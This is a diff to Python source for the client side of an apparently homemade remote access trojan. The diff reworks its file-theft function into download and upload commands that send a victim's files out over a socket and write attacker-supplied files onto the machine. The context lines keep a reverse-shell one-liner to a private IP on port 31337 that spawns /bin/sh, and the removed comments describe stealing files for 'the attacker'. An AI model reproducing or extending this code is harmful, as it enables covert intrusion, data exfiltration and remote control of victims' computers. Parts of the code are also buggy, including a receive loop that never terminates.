@@ -6,44 +6,48 @@ import subprocess
 import os
 import platform
 import sys
+import ctypes
+import hashlib
 
-
-# In the transfer function, we first check if the file exists in the first place, if not we will notify the attacker
-# otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the
-# server has no idea about the end of the file we add a tag called 'DONE' to address this issue, finally we close the file
-
-
-def transfer(s,path):
-    if os.path.exists(path):
-        f = open(path, 'rb')
-        packet = f.read(1024)
-        while packet != '':
-            s.send(packet)
+def transfer(s,command):
+    x1,src,dst=map(str,command.split(' '))
+    if (x1=='download'):
+        if os.path.exists(src):
+            f = open(src, 'rb')
             packet = f.read(1024)
-        s.send('DONE')
-        f.close()
-
-    else: # the file doesn't exist
-        s.send('Unable to find out the file')
-
-def recieve(s):
-    print('We are receiving a file')
-    f = open('C:\\Temp\\test.txt', 'wb')
-    while True:
-        bits = s.recv(1024)
-        print(bits)
-        if 'File does not exist' in bits:
-            print('File does not exist')
-            break
-        elif bits.endswith('DONE'):
-            print('[+] Tansfer Complete ')
+            while packet != '':
+                s.send(packet) 
+                packet = f.read(1024)
+            s.send('DONE')
             f.close()
-            break
-        else:
-            f.write(bits)
-            print('[+] Tansfer Complete ')
-            f.close()
-            break
+        else: # the file doesn't exist
+            s.send('Unable to find out the file')
+        md5_cl=hashlib.md5(open(src,'rb').read()).hexdigest()
+        md5_sv=s.recv(1024)
+        if md5_sv==md5_cl :
+            s.send('md5 OK')
+        else :
+            s.send('md5 NOK')
+  
+    elif (x1=='upload'):
+        file_to_write=open(dst,'wb')
+        bits=s.recv(1024)    
+        while True: 
+            if not bits.endswith('DONE'):
+                file_to_write.write(bits)
+            elif bits.endswith('DONE'):
+                bits=bits.replace('DONE','')
+                file_to_write.write(bits)
+                file_to_write.close()
+                break
+            #bits=s.recv(1024)
+        #md5_cl=hashlib.md5(open(dst,'rb').read()).hexdigest()
+        #md5_sv=s.recv(1024)
+        #if md5_cl==md5_sv:
+        #    s.send('md5 OK')
+        #else :
+        #    s.send('md5 NOK')
+
 
 def connect():
     #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.50",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -61,26 +65,10 @@ def connect():
             s.close()
             break
 
-
-# if we received grab keyword from the attacker, then this is an indicator for
-# file transfer operation, hence we will split the received commands into two
-# parts, the second part which we interested in contains the file path, so we will
-# store it into a variable called path and pass it to transfer function
-
-# Remember the Formula is  grab*<File Path>
-# Example:  grab*C:\Users\Ghost\Desktop\photo.jpeg
-
-        elif 'grab' in command:
-            grab,path = command.split('*')
-
-            try:                          # when it comes to low level file transfer, allot of things can go wrong, therefore
-                                          # we use exception handling (try and except) to protect our script from being crashed
-                                          # in case something went wrong, we will send the error that happened and pass the exception
-                transfer(s,path)
-            except Exception,e:
-                s.send ( str(e) )  # send the exception error
-                pass
-
+        elif 'download' in command:            
+            transfer(s,command)
+        elif 'upload' in command:
+            transfer(s,command)
 
         #elif 'cd' in command:# the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
          #   code,directory = command.split(" ") # split up the received command based on space into two variables
